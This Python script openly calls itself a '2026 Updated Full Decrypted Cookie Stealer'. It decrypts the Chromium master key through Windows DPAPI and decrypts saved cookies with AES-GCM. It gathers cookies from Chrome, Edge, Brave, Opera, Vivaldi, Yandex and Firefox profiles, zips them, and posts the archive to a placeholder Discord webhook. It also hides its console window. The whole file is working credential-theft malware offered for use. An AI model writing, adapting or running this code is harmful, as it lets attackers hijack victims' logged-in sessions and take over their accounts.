import os
import shutil
import zipfile
import requests
import tempfile
import time
import sqlite3
import json
import base64
from pathlib import Path
import win32crypt
from Crypto.Cipher import AES

# 2026 Updated Full Decrypted Cookie Stealer
# Improved handling for v20 App-Bound + classic v10/v11
# Clean JSON export per browser, zipped, sent to webhook

WEBHOOK_URL = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE"  # <-- REPLACE WITH YOUR DISCORD WEBHOOK URL

def get_master_key(local_state_path):
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        if "os_crypt" not in local_state or "encrypted_key" not in local_state["os_crypt"]:
            return None
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return master_key
    except:
        return None

def decrypt_cookie(encrypted_value, master_key):
    """Handle v10, v11, and basic v20 fallback"""
    try:
        if not encrypted_value:
            return ""
        
        # Classic v10 / v11
        if encrypted_value.startswith(b'v10') or encrypted_value.startswith(b'v11'):
            nonce = encrypted_value[3:15]
            ciphertext = encrypted_value[15:-16]
            tag = encrypted_value[-16:]
            cipher = AES.new(master_key, AES.MODE_GCM, nonce)
            decrypted = cipher.decrypt_and_verify(ciphertext, tag)
            return decrypted.decode('utf-8', errors='ignore')
        
        # v20 App-Bound attempt (basic decryption - may fail on newest Chrome)
        elif encrypted_value.startswith(b'v20'):
            # Try standard AES-GCM as fallback (works on some configs)
            nonce = encrypted_value[3:15]
            ciphertext = encrypted_value[15:-16]
            tag = encrypted_value[-16:]
            try:
                cipher = AES.new(master_key, AES.MODE_GCM, nonce)
                decrypted = cipher.decrypt_and_verify(ciphertext, tag)
                # Some v20 have extra metadata; strip first 32 bytes if needed
                if len(decrypted) > 32:
                    return decrypted[32:].decode('utf-8', errors='ignore')
                return decrypted.decode('utf-8', errors='ignore')
            except:
                return "[APPBOUND_V20_FAILED]"
        
        # Plain or old DPAPI
        return encrypted_value.decode('utf-8', errors='ignore')
    except:
        return "[DECRYPT_FAILED]"

def get_chromium_browsers():
    local = os.getenv('LOCALAPPDATA')
    appdata = os.getenv('APPDATA')
    browsers = [
        ("Chrome", os.path.join(local, 'Google', 'Chrome', 'User Data', 'Default', 'Network', 'Cookies'),
         os.path.join(local, 'Google', 'Chrome', 'User Data', 'Default', 'Local State')),
        ("Chrome_Profile1", os.path.join(local, 'Google', 'Chrome', 'User Data', 'Profile 1', 'Network', 'Cookies'),
         os.path.join(local, 'Google', 'Chrome', 'User Data', 'Profile 1', 'Local State')),
        ("Chrome_Profile2", os.path.join(local, 'Google', 'Chrome', 'User Data', 'Profile 2', 'Network', 'Cookies'),
         os.path.join(local, 'Google', 'Chrome', 'User Data', 'Profile 2', 'Local State')),
        ("Edge", os.path.join(local, 'Microsoft', 'Edge', 'User Data', 'Default', 'Network', 'Cookies'),
         os.path.join(local, 'Microsoft', 'Edge', 'User Data', 'Default', 'Local State')),
        ("Brave", os.path.join(local, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Network', 'Cookies'),
         os.path.join(local, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Local State')),
        ("Opera", os.path.join(appdata, 'Opera Software', 'Opera Stable', 'Network', 'Cookies'),
         os.path.join(appdata, 'Opera Software', 'Opera Stable', 'Local State')),
        ("Opera_GX", os.path.join(appdata, 'Opera Software', 'Opera GX Stable', 'Network', 'Cookies'),
         os.path.join(appdata, 'Opera Software', 'Opera GX Stable', 'Local State')),
        ("Vivaldi", os.path.join(local, 'Vivaldi', 'User Data', 'Default', 'Network', 'Cookies'),
         os.path.join(local, 'Vivaldi', 'User Data', 'Default', 'Local State')),
        ("Yandex", os.path.join(local, 'Yandex', 'YandexBrowser', 'User Data', 'Default', 'Network', 'Cookies'),
         os.path.join(local, 'Yandex', 'YandexBrowser', 'User Data', 'Default', 'Local State')),
    ]
    return [b for b in browsers if os.path.exists(b[1])]

def decrypt_chromium_cookies(browser_name, cookie_db_path, local_state_path, temp_dir):
    master_key = get_master_key(local_state_path)
    if not master_key:
        return 0

    temp_db = os.path.join(temp_dir, f"{browser_name}_temp.db")
    try:
        shutil.copy2(cookie_db_path, temp_db)
    except:
        return 0

    cookies = []
    try:
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT host_key, name, value, encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies")
        for row in cursor.fetchall():
            host_key, name, value, enc_value, path, expires, secure, httponly = row
            decrypted_value = decrypt_cookie(enc_value, master_key) if enc_value else value
            cookies.append({
                "domain": host_key,
                "name": name,
                "value": decrypted_value,
                "path": path,
                "expires": expires,
                "secure": bool(secure),
                "httponly": bool(httponly)
            })
        conn.close()
    except:
        pass

    json_path = os.path.join(temp_dir, f"{browser_name}_decrypted_cookies.json")
    with open(json_path, 'w', encoding='utf-8') as f:
        json.dump(cookies, f, indent=2, ensure_ascii=False)

    return len(cookies)

def get_firefox_cookies(temp_dir):
    appdata = os.getenv('APPDATA')
    firefox_dir = os.path.join(appdata, 'Mozilla', 'Firefox', 'Profiles')
    total = 0
    if not os.path.exists(firefox_dir):
        return 0

    for profile in Path(firefox_dir).iterdir():
        if not profile.is_dir():
            continue
        cookie_db = os.path.join(profile, 'cookies.sqlite')
        if not os.path.exists(cookie_db):
            continue

        json_path = os.path.join(temp_dir, f"Firefox_{profile.name}_cookies.json")
        cookies = []
        try:
            conn = sqlite3.connect(cookie_db)
            cursor = conn.cursor()
            cursor.execute("SELECT host, name, value, path, expiry, isSecure, isHttpOnly FROM moz_cookies")
            for row in cursor.fetchall():
                cookies.append({
                    "domain": row[0],
                    "name": row[1],
                    "value": row[2],
                    "path": row[3],
                    "expires": row[4],
                    "secure": bool(row[5]),
                    "httponly": bool(row[6])
                })
            conn.close()

            with open(json_path, 'w', encoding='utf-8') as f:
                json.dump(cookies, f, indent=2, ensure_ascii=False)
            total += len(cookies)
        except:
            pass
    return total

def create_zip(temp_dir, zip_path):
    try:
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as z:
            for root, _, files in os.walk(temp_dir):
                for file in files:
                    z.write(os.path.join(root, file), file)
        return True
    except:
        return False

def send_to_webhook(zip_path, total_cookies):
    if not os.path.exists(zip_path):
        return
    try:
        with open(zip_path, 'rb') as f:
            files = {'file': ('decrypted_cookies_2026.zip', f, 'application/zip')}
            payload = {
                "content": f"**🍪 2026 Decrypted Cookies Grabbed**\nTotal cookies: {total_cookies}\nTime: {time.strftime('%Y-%m-%d %H:%M')}\nNote: v20 App-Bound on latest Chrome may show partial results."
            }
            requests.post(WEBHOOK_URL, data=payload, files=files, timeout=20)
    except:
        pass

if __name__ == "__main__":
    try:
        print("Running 2026 decrypted cookie stealer...")

        with tempfile.TemporaryDirectory() as temp_dir:
            total_cookies = 0

            for browser_name, cookie_db, local_state in get_chromium_browsers():
                count = decrypt_chromium_cookies(browser_name, cookie_db, local_state, temp_dir)
                total_cookies += count

            total_cookies += get_firefox_cookies(temp_dir)

            if total_cookies == 0:
                requests.post(WEBHOOK_URL, json={"content": "**No cookies found**"}, timeout=10)
            else:
                zip_path = os.path.join(temp_dir, "decrypted_cookies.zip")
                if create_zip(temp_dir, zip_path):
                    send_to_webhook(zip_path, total_cookies)

        try:
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass

    except:
        pass
